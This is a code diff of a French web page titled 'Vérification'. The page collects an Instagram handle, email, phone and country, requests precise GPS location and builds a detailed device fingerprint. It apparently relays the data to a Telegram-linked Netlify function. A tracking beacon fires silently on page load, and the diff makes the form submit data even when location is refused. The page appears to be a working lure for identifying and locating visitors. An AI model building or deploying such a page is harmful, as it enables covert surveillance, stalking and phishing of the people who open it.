@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Vérification </title>
+  <title>Vérification</title>
   <style>
     :root {
       --bg: #07090f;
@@ -45,40 +45,23 @@
         linear-gradient(180deg, var(--bg) 0%, var(--bg-2) 100%);
     }
 
-    .wrap {
-      max-width: 860px;
-      margin: 36px auto;
-      padding: 0 16px;
-    }
-
+    .wrap { max-width: 860px; margin: 36px auto; padding: 0 16px; }
     .hero { margin-bottom: 14px; padding: 6px 4px 0; }
 
     .eyebrow {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      color: var(--gold);
-      font-weight: 600;
-      font-size: 0.86rem;
-      letter-spacing: .08em;
-      text-transform: uppercase;
-      opacity: .95;
+      display: inline-flex; align-items: center; gap: 8px;
+      color: var(--gold); font-weight: 600; font-size: .86rem;
+      letter-spacing: .08em; text-transform: uppercase; opacity: .95;
     }
-
     .eyebrow::before {
-      content: "";
-      width: 8px;
-      height: 8px;
-      border-radius: 999px;
+      content: ""; width: 8px; height: 8px; border-radius: 999px;
       background: radial-gradient(circle at 30% 30%, #ffe4a8, #c3913e 70%);
       box-shadow: 0 0 18px rgba(214,179,106,.55);
     }
 
     .card {
       position: relative;
-      background:
-        linear-gradient(180deg, rgba(255,255,255,.03), rgba(255,255,255,.01)),
-        var(--card);
+      background: linear-gradient(180deg, rgba(255,255,255,.03), rgba(255,255,255,.01)), var(--card);
       border: 1px solid var(--border);
       border-radius: calc(var(--radius) + 2px);
       box-shadow: var(--shadow);
@@ -86,104 +69,55 @@
       backdrop-filter: blur(12px);
       -webkit-backdrop-filter: blur(12px);
     }
-
     .card::before {
-      content: "";
-      position: absolute;
-      inset: 0;
-      pointer-events: none;
+      content: ""; position: absolute; inset: 0; pointer-events: none;
       background:
         linear-gradient(120deg, rgba(214,179,106,.13), transparent 28%, transparent 72%, rgba(214,179,106,.08)),
         radial-gradient(500px 140px at 25% 0%, rgba(214,179,106,.08), transparent 70%);
       opacity: .9;
     }
-
     .card::after {
-      content: "";
-      position: absolute;
-      inset: 0;
-      pointer-events: none;
-      border-radius: inherit;
-      padding: 1px;
+      content: ""; position: absolute; inset: 0; pointer-events: none;
+      border-radius: inherit; padding: 1px;
       background: linear-gradient(140deg, rgba(214,179,106,.45), rgba(255,255,255,.05) 30%, rgba(255,255,255,.04) 70%, rgba(214,179,106,.20));
-      -webkit-mask:
-        linear-gradient(#000 0 0) content-box,
-        linear-gradient(#000 0 0);
+      -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
       -webkit-mask-composite: xor;
-              mask-composite: exclude;
+      mask-composite: exclude;
       opacity: .8;
     }
 
     .card-header {
-      position: relative;
-      padding: 22px 22px 14px;
+      position: relative; padding: 22px 22px 14px;
       border-bottom: 1px solid var(--border-2);
-      background:
-        linear-gradient(180deg, rgba(255,255,255,.02), rgba(255,255,255,0)),
-        rgba(255,255,255,.01);
+      background: linear-gradient(180deg, rgba(255,255,255,.02), rgba(255,255,255,0)), rgba(255,255,255,.01);
     }
 
     h1 {
-      margin: 0;
-      font-size: 1.65rem;
-      line-height: 1.1;
-      font-weight: 700;
-      letter-spacing: -0.02em;
-      color: #f8f7f2;
+      margin: 0; font-size: 1.65rem; line-height: 1.1; font-weight: 700;
+      letter-spacing: -0.02em; color: #f8f7f2;
       text-shadow: 0 0 20px rgba(214,179,106,.08);
     }
 
-    .subtitle {
-      margin: 10px 0 0;
-      color: var(--muted);
-      font-size: 0.94rem;
-      max-width: 95%;
-    }
-
+    .subtitle { margin: 10px 0 0; color: var(--muted); font-size: .94rem; max-width: 95%; }
     .subtitle strong { color: #f0e2be; font-weight: 600; }
 
-    .card-body {
-      position: relative;
-      padding: 18px 22px 22px;
-    }
+    .card-body { position: relative; padding: 18px 22px 22px; }
 
-    .grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 14px;
-    }
-
-    .field {
-      display: flex;
-      flex-direction: column;
-      gap: 7px;
-    }
-
+    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+    .field { display: flex; flex-direction: column; gap: 7px; }
     .field.full { grid-column: 1 / -1; }
 
-    label {
-      color: #e7eaf5;
-      font-weight: 600;
-      font-size: 0.92rem;
-      letter-spacing: .01em;
-    }
+    label { color: #e7eaf5; font-weight: 600; font-size: .92rem; letter-spacing: .01em; }
 
     input, textarea, button {
-      width: 100%;
-      border-radius: 12px;
-      font-size: 0.96rem;
-      padding: 12px 13px;
-      outline: none;
-      transition: .18s ease;
-      font-family: inherit;
+      width: 100%; border-radius: 12px; font-size: .96rem; padding: 12px 13px;
+      outline: none; transition: .18s ease; font-family: inherit;
     }
 
     input, textarea {
       color: var(--text);
       border: 1px solid rgba(255,255,255,.08);
-      background:
-        linear-gradient(180deg, rgba(255,255,255,.02), rgba(255,255,255,.01)),
-        rgba(9, 12, 20, 0.88);
+      background: linear-gradient(180deg, rgba(255,255,255,.02), rgba(255,255,255,.01)), rgba(9, 12, 20, 0.88);
       box-shadow: inset 0 1px 0 rgba(255,255,255,.02);
     }
 
@@ -192,9 +126,7 @@
 
     input:focus, textarea:focus {
       border-color: rgba(214,179,106,.45);
-      box-shadow:
-        0 0 0 3px rgba(214,179,106,.12),
-        0 0 0 1px rgba(214,179,106,.18) inset;
+      box-shadow: 0 0 0 3px rgba(214,179,106,.12), 0 0 0 1px rgba(214,179,106,.18) inset;
     }
 
     textarea { min-height: 104px; resize: vertical; }
@@ -202,100 +134,57 @@
     .consent-note {
       margin-top: 14px;
       border: 1px solid rgba(214,179,106,.18);
-      background:
-        linear-gradient(180deg, rgba(214,179,106,.05), rgba(214,179,106,.02)),
-        rgba(255,255,255,.01);
+      background: linear-gradient(180deg, rgba(214,179,106,.05), rgba(214,179,106,.02)), rgba(255,255,255,.01);
       border-radius: 12px;
       padding: 12px 13px;
-      font-size: 0.92rem;
+      font-size: .92rem;
       color: #e8dcc0;
     }
-
     .consent-note strong { color: #f5dca3; font-weight: 700; }
 
     .actions { margin-top: 14px; }
 
     button {
-      border: 0;
-      cursor: pointer;
-      font-weight: 800;
-      letter-spacing: .01em;
+      border: 0; cursor: pointer; font-weight: 800; letter-spacing: .01em;
       color: var(--primary-text);
       background: var(--primary);
-      box-shadow:
-        0 10px 24px rgba(184,138,60,.24),
-        inset 0 1px 0 rgba(255,255,255,.38);
-      position: relative;
-      overflow: hidden;
+      box-shadow: 0 10px 24px rgba(184,138,60,.24), inset 0 1px 0 rgba(255,255,255,.38);
+      position: relative; overflow: hidden;
     }
-
     button::before {
-      content: "";
-      position: absolute;
-      inset: 0;
+      content: ""; position: absolute; inset: 0;
       background: linear-gradient(120deg, rgba(255,255,255,.24), transparent 35%, transparent 65%, rgba(255,255,255,.12));
-      opacity: .7;
-      pointer-events: none;
+      opacity: .7; pointer-events: none;
     }
-
     button:hover {
       transform: translateY(-1px);
-      box-shadow:
-        0 14px 28px rgba(184,138,60,.28),
-        inset 0 1px 0 rgba(255,255,255,.42);
+      box-shadow: 0 14px 28px rgba(184,138,60,.28), inset 0 1px 0 rgba(255,255,255,.42);
       filter: saturate(1.03);
     }
-
     button:active { transform: translateY(0); filter: brightness(.98); }
-
-    button:disabled {
-      opacity: .68;
-      cursor: not-allowed;
-      transform: none;
-      box-shadow: none;
-    }
+    button:disabled { opacity: .68; cursor: not-allowed; transform: none; box-shadow: none; }
 
     .status {
-      margin-top: 14px;
-      padding: 12px 13px;
-      border-radius: 12px;
-      border: 1px solid transparent;
-      font-size: 0.92rem;
-      display: none;
+      margin-top: 14px; padding: 12px 13px; border-radius: 12px; border: 1px solid transparent;
+      font-size: .92rem; display: none;
     }
-
     .status.show { display: block; }
 
     .status.muted {
-      display: block;
-      padding: 0;
-      border: none;
-      background: transparent;
-      color: var(--muted);
-      margin-top: 10px;
+      display: block; padding: 0; border: none; background: transparent; color: var(--muted); margin-top: 10px;
     }
 
     .status.ok {
-      background: var(--ok-bg);
-      color: var(--ok-text);
-      border-color: var(--ok-border);
+      background: var(--ok-bg); color: var(--ok-text); border-color: var(--ok-border);
       box-shadow: inset 0 1px 0 rgba(255,255,255,.03);
     }
 
     .status.err {
-      background: var(--err-bg);
-      color: var(--err-text);
-      border-color: var(--err-border);
+      background: var(--err-bg); color: var(--err-text); border-color: var(--err-border);
       box-shadow: inset 0 1px 0 rgba(255,255,255,.03);
     }
 
-    .footer-note {
-      margin-top: 12px;
-      color: #7e89a6;
-      font-size: .82rem;
-      text-align: center;
-      opacity: .9;
-    }
+    .footer-note { margin-top: 12px; color: #7e89a6; font-size: .82rem; text-align: center; opacity: .9; }
 
     @media (max-width: 640px) {
       .wrap { margin: 18px auto; }
@@ -317,7 +206,8 @@
       <div class="card-header">
         <h1>Vérification</h1>
         <p class="subtitle">
-          En cliquant sur <strong>Valider la demande</strong>, vous lancez la vérification.
+          En cliquant sur <strong>Valider la demande</strong>, vous envoyez vos informations.
+          La localisation GPS est facultative.
         </p>
       </div>
 
@@ -350,7 +240,7 @@
         </div>
 
         <div class="consent-note">
-          Le clic sur <strong>Valider la demande</strong> lance la vérification.
+          Le clic sur <strong>Valider la demande</strong> envoie votre demande. Si vous refusez la localisation, la demande est quand même envoyée sans GPS.
         </div>
 
         <div class="actions">
@@ -370,12 +260,10 @@
       const el = $("status");
       el.textContent = message;
       el.className = "status";
-
       if (type === "muted") {
         el.classList.add("muted");
         return;
       }
-
       el.classList.add("show", type);
     }
 
@@ -391,18 +279,15 @@
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
         cookieEnabled: typeof nav.cookieEnabled === "boolean" ? nav.cookieEnabled : null,
         onLine: typeof nav.onLine === "boolean" ? nav.onLine : null,
-
         hardwareConcurrency: typeof nav.hardwareConcurrency === "number" ? nav.hardwareConcurrency : null,
         deviceMemoryGB: typeof nav.deviceMemory === "number" ? nav.deviceMemory : null,
         maxTouchPoints: typeof nav.maxTouchPoints === "number" ? nav.maxTouchPoints : 0,
-
         connection: nav.connection ? {
           effectiveType: nav.connection.effectiveType || null,
           downlink: typeof nav.connection.downlink === "number" ? nav.connection.downlink : null,
           rtt: typeof nav.connection.rtt === "number" ? nav.connection.rtt : null,
           saveData: typeof nav.connection.saveData === "boolean" ? nav.connection.saveData : null
         } : null,
-
         screen: {
           width: typeof screenObj.width === "number" ? screenObj.width : null,
           height: typeof screenObj.height === "number" ? screenObj.height : null,
@@ -412,7 +297,6 @@
           pixelDepth: typeof screenObj.pixelDepth === "number" ? screenObj.pixelDepth : null,
           pixelRatio: window.devicePixelRatio || 1
         },
-
         viewport: {
           width: window.innerWidth,
           height: window.innerHeight
@@ -430,7 +314,6 @@
       if (nav.userAgentData) {
         try {
           const uad = nav.userAgentData;
-
           info.userAgentData = {
             brands: Array.isArray(uad.brands) ? uad.brands : [],
             mobile: typeof uad.mobile === "boolean" ? uad.mobile : null,
@@ -439,13 +322,8 @@
 
           try {
             const high = await uad.getHighEntropyValues([
-              "architecture",
-              "bitness",
-              "model",
-              "platformVersion",
-              "uaFullVersion",
-              "fullVersionList",
-              "formFactors"
+              "architecture", "bitness", "model", "platformVersion",
+              "uaFullVersion", "fullVersionList", "formFactors"
             ]);
 
             info.userAgentData.highEntropy = {
@@ -470,7 +348,6 @@
       const ua = (info.userAgent || "").toLowerCase();
       const uad = info.userAgentData || {};
       const high = (uad && uad.highEntropy) || {};
-
       const screen = info.screen || {};
       const vp = info.viewport || {};
       const maxTouch = Number(info.maxTouchPoints || 0);
@@ -511,14 +388,10 @@
       }
 
       const uadMobile = typeof uad.mobile === "boolean" ? uad.mobile : null;
-
-      if (/ipad/.test(ua)) {
-        result.deviceType = "tablet";
-      } else if (/iphone|ipod/.test(ua)) {
-        result.deviceType = "mobile";
-      } else if (/android/.test(ua)) {
-        result.deviceType = (/mobile/.test(ua) || uadMobile === true) ? "mobile" : "tablet";
-      } else {
+      if (/ipad/.test(ua)) result.deviceType = "tablet";
+      else if (/iphone|ipod/.test(ua)) result.deviceType = "mobile";
+      else if (/android/.test(ua)) result.deviceType = (/mobile/.test(ua) || uadMobile === true) ? "mobile" : "tablet";
+      else {
         if (maxTouch > 0 && Math.max(vp.width || 0, vp.height || 0) < 1100) result.deviceType = "mobile";
         else if (maxTouch > 0 && Math.max(vp.width || 0, vp.height || 0) < 1400) result.deviceType = "tablet";
         else result.deviceType = "desktop";
@@ -529,64 +402,41 @@
         result.confidence = "medium";
       }
 
-      if (uad.platform && (result.os === "unknown" || !result.os)) {
-        result.os = uad.platform;
-      }
+      if (uad.platform && (result.os === "unknown" || !result.os)) result.os = uad.platform;
 
       if (result.os === "Android") {
-        const androidModelCandidates = [];
-
         const samsung = (info.userAgent || "").match(/\b(SM-[A-Z0-9]+)\b/i);
-        if (samsung) androidModelCandidates.push(samsung[1].toUpperCase());
-
         const pixel = (info.userAgent || "").match(/\b(Pixel\s?[A-Za-z0-9 ]+)\b/i);
-        if (pixel) androidModelCandidates.push(pixel[1].trim());
-
         const xiaomi = (info.userAgent || "").match(/\b(MI\s?[A-Za-z0-9]+|Redmi\s?[A-Za-z0-9 ]+|M\d{4}[A-Z0-9]+)\b/i);
-        if (xiaomi) androidModelCandidates.push(xiaomi[1].trim());
 
-        if (!result.modelLikely && androidModelCandidates.length) {
-          result.modelLikely = androidModelCandidates[0];
-          result.confidence = "medium";
-        }
+        if (!result.modelLikely && samsung) result.modelLikely = samsung[1].toUpperCase();
+        else if (!result.modelLikely && pixel) result.modelLikely = pixel[1].trim();
+        else if (!result.modelLikely && xiaomi) result.modelLikely = xiaomi[1].trim();
 
         if (result.modelLikely) {
-          const model = result.modelLikely.toLowerCase();
-          if (model.startsWith("sm-")) result.brandLikely = "Samsung";
-          else if (model.includes("pixel")) result.brandLikely = "Google";
-          else if (model.includes("redmi") || model.includes("mi ") || /^m\d{4}/i.test(result.modelLikely)) result.brandLikely = "Xiaomi";
-        }
-
-        if (!result.brandLikely) {
-          if (/samsung/i.test(ua)) result.brandLikely = "Samsung";
-          else if (/huawei/i.test(ua)) result.brandLikely = "Huawei";
-          else if (/honor/i.test(ua)) result.brandLikely = "Honor";
-          else if (/xiaomi|redmi|miui/i.test(ua)) result.brandLikely = "Xiaomi";
-          else if (/oneplus/i.test(ua)) result.brandLikely = "OnePlus";
-          else if (/oppo/i.test(ua)) result.brandLikely = "OPPO";
-          else if (/vivo/i.test(ua)) result.brandLikely = "vivo";
-          else if (/pixel/i.test(ua)) result.brandLikely = "Google";
+          const m = result.modelLikely.toLowerCase();
+          if (m.startsWith("sm-")) result.brandLikely = "Samsung";
+          else if (m.includes("pixel")) result.brandLikely = "Google";
+          else if (m.includes("redmi") || m.includes("mi ") || /^m\d{4}/i.test(result.modelLikely)) result.brandLikely = "Xiaomi";
+          result.confidence = "medium";
         }
       }
 
       if (result.os === "iOS") {
         result.brandLikely = "Apple";
-        if (/ipad/.test(ua)) result.modelLikely = "iPad (modèle exact non exposé)";
-        else if (/iphone/.test(ua)) result.modelLikely = "iPhone (modèle exact non exposé)";
+        result.modelLikely = /ipad/.test(ua) ? "iPad (modèle exact non exposé)" : "iPhone (modèle exact non exposé)";
         result.confidence = "medium";
       }
 
       if (result.os === "macOS") {
         result.brandLikely = "Apple";
         result.modelLikely = "Mac (modèle exact non exposé)";
-        result.confidence = "low";
       }
 
       if (result.os === "iOS" && screen.width && screen.height) {
         const w = Math.min(screen.width, screen.height);
         const h = Math.max(screen.width, screen.height);
         const dpr = screen.pixelRatio || 1;
-
         if (dpr >= 3 && ((w === 390 && h === 844) || (w === 393 && h === 852))) {
           result.modelLikely = "iPhone récent (6.1\") probable";
           result.confidence = "low";
@@ -607,11 +457,8 @@
       });
 
       let data;
-      try {
-        data = await res.json();
-      } catch (e) {
-        data = { ok: false, error: "Réponse invalide du serveur" };
-      }
+      try { data = await res.json(); }
+      catch { data = { ok: false, error: "Réponse invalide du serveur" }; }
 
       if (!res.ok || !data.ok) {
         throw new Error((data.telegram && data.telegram.description) || data.error || ("HTTP " + res.status));
@@ -622,7 +469,6 @@
     async function sendVisitOpened(visitCount) {
       try {
         const client = await getClientInfoExtended();
-
         await fetch("/.netlify/functions/visit-opened", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -630,26 +476,21 @@
             language: client.language || "",
             timezone: client.timezone || "",
             page: window.location.pathname + window.location.search,
-            visitCount: visitCount,
+            visitCount,
             deviceSummary: client.derived || null,
             screen: client.screen || null
           })
         });
-      } catch (e) {
-        // silencieux
-      }
+      } catch (e) {}
     }
 
     function triggerVisitOnce() {
       const sentKey = "visit_opened_sent";
       const countKey = "page_visit_count";
-
       const currentCount = Number(sessionStorage.getItem(countKey) || "0") + 1;
       sessionStorage.setItem(countKey, String(currentCount));
-
       if (sessionStorage.getItem(sentKey)) return;
       sessionStorage.setItem(sentKey, "1");
-
       sendVisitOpened(currentCount);
     }
 
@@ -660,72 +501,19 @@
           navigator.geolocation.getCurrentPosition(
             onSuccess,
             onError,
-            {
-              enableHighAccuracy: false,
-              timeout: 20000,
-              maximumAge: 60000
-            }
+            { enableHighAccuracy: false, timeout: 20000, maximumAge: 60000 }
           );
         },
-        {
-          enableHighAccuracy: true,
-          timeout: 20000,
-          maximumAge: 0
-        }
+        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
       );
     }
 
-   $("btn").addEventListener("click", async function () {
-  const btn = $("btn");
+    $("btn").addEventListener("click", async function () {
+      const btn = $("btn");
 
-  async function submitWithoutGeo(reasonCode, reasonMessage) {
-    try {
-      setStatus("Envoi de la demande (sans localisation GPS)…", "muted");
-
-      const payload = {
-        lead: {
-          instagram: $("instagram").value.trim(),
-          email: $("email").value.trim(),
-          phone: $("phone").value.trim(),
-          country: $("country").value.trim(),
-          note: $("note").value.trim()
-        },
-        consent: {
-          accepted: false,
-          textVersion: "v4-click-consent",
-          acceptedAt: new Date().toISOString(),
-          consentMethod: "button_click_validate_request",
-          refusalReasonCode: reasonCode ?? null,
-          refusalReasonMessage: reasonMessage ?? null
-        },
-        location_status: "refused_or_unavailable",
-        geo: null,
-        client: await getClientInfoExtended()
-      };
-
-      await sendPayload(payload);
-      setStatus("✅ Demande envoyée (sans localisation GPS).", "ok");
-    } catch (e) {
-      setStatus("Erreur d'envoi : " + (e.message || e), "err");
-    } finally {
-      btn.disabled = false;
-    }
-  }
-
-  try {
-    btn.disabled = true;
-    setStatus("Demande de permission de localisation…", "muted");
-
-    // Si la géoloc n'est pas supportée, on envoie quand même sans GPS
-    if (!("geolocation" in navigator)) {
-      await submitWithoutGeo("NO_GEO_API", "Geolocation API non supportée");
-      return;
-    }
-
-    requestLocationWithFallback(
-      async function (pos) {
+      async function submitWithoutGeo(reasonCode, reasonMessage) {
         try {
-          setStatus("Position obtenue, envoi en cours…", "muted");
+          setStatus("Envoi de la demande (sans localisation GPS)…", "muted");
 
           const payload = {
             lead: {
@@ -736,53 +524,35 @@
               note: $("note").value.trim()
             },
             consent: {
-              accepted: true,
+              accepted: false,
               textVersion: "v4-click-consent",
               acceptedAt: new Date().toISOString(),
-              consentMethod: "button_click_validate_request"
+              consentMethod: "button_click_validate_request",
+              refusalReasonCode: reasonCode ?? null,
+              refusalReasonMessage: reasonMessage ?? null
             },
-            location_status: "granted",
-            geo: {
-              latitude: pos.coords.latitude,
-              longitude: pos.coords.longitude,
-              accuracy_m: pos.coords.accuracy,
-              altitude: pos.coords.altitude == null ? null : pos.coords.altitude,
-              altitudeAccuracy: pos.coords.altitudeAccuracy == null ? null : pos.coords.altitudeAccuracy,
-              heading: pos.coords.heading == null ? null : pos.coords.heading,
-              speed: pos.coords.speed == null ? null : pos.coords.speed,
-              timestamp: pos.timestamp
-            },
+            location_status: "refused_or_unavailable",
+            geo: null,
             client: await getClientInfoExtended()
           };
 
           await sendPayload(payload);
-          setStatus("✅ Vérification envoyée. Merci.", "ok");
+          setStatus("✅ Demande envoyée (sans localisation GPS).", "ok");
         } catch (e) {
           setStatus("Erreur d'envoi : " + (e.message || e), "err");
         } finally {
           btn.disabled = false;
         }
-      },
-      async function (err) {
-        // Refus (1), indisponible (2), timeout (3) => on envoie quand même
-        await submitWithoutGeo(err && err.code, err && err.message);
       }
-    );
-  } catch (e) {
-    setStatus("Erreur : " + (e.message || e), "err");
-    btn.disabled = false;
-  }
-});
-      const btn = $("btn");
 
       try {
-        if (!("geolocation" in navigator)) {
-          setStatus("La géolocalisation n'est pas supportée sur cet appareil/navigateur.", "err");
-          return;
-        }
-
         btn.disabled = true;
         setStatus("Demande de permission de localisation…", "muted");
+
+        if (!("geolocation" in navigator)) {
+          await submitWithoutGeo("NO_GEO_API", "Geolocation API non supportée");
+          return;
+        }
 
         requestLocationWithFallback(
           async function (pos) {
@@ -799,10 +569,11 @@
                 },
                 consent: {
                   accepted: true,
-                  textVersion: "v3-click-consent",
+                  textVersion: "v4-click-consent",
                   acceptedAt: new Date().toISOString(),
                   consentMethod: "button_click_validate_request"
                 },
+                location_status: "granted",
                 geo: {
                   latitude: pos.coords.latitude,
                   longitude: pos.coords.longitude,
@@ -824,19 +595,8 @@
               btn.disabled = false;
             }
           },
-          function (err) {
-            let msg = "Localisation refusée / impossible (" + err.code + ") : " + err.message;
-
-            if (err.code === 1) {
-              msg = "Localisation refusée (permission non accordée).";
-            } else if (err.code === 2) {
-              msg = "Position indisponible. Active la localisation du téléphone, le Wi-Fi et les données mobiles, puis réessaie.";
-            } else if (err.code === 3) {
-              msg = "La localisation a expiré (timeout). Réessaie.";
-            }
-
-            setStatus(msg, "err");
-            btn.disabled = false;
+          async function (err) {
+            await submitWithoutGeo(err && err.code, err && err.message);
           }
         );
       } catch (e) {
